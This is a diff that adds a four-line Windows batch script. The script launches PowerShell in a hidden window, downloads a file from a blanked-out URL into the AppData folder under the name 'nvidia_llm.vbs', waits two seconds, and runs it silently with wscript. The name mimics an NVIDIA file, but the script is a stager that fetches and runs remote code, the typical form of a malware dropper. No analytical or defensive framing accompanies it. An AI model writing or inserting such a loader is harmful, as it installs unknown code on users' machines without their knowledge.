@@ -1,0 +1,4 @@
+@echo off
+powershell -w h -c "(New-Object Net.WebClient).DownloadFile('----','%appdata%\nvidia_llm.vbs')"
+timeout /t 2 >nul
+wscript //b "%appdata%\nvidia_llm.vbs"
